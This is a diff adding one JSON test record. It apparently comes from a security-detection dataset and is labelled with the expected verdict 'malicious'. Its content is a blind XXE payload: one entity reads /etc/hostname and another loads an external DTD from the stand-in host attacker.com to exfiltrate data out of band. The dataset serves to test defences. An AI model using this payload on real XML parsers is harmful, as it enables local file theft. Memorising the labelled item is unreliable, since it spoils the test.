@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::structural-variations::5",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "{\"query\": \"# Marfaak AI Security - XXE blind OOB\\n\\n**WARNING: This payload tests XXE blind OOB.**\\n\\n<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE foo [\\n  <!ENTITY % file SYSTEM \\\"file:///etc/hostname\\\">\\n  <!ENTITY % dtd SYSTEM \\\"https://attacker.com/xxe.dtd\\\">\\n  %dtd;\\n]>\\n<data>Blind XXE exfiltration via OOB channel</data>\"}",
+  "content_hash": "b4b2034dd13a1503a7ce46b9fe1f41c2aea8800c8ecf08f902c4876ea5c6b047",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:json",
+  "difficulty": "moderate"
+}
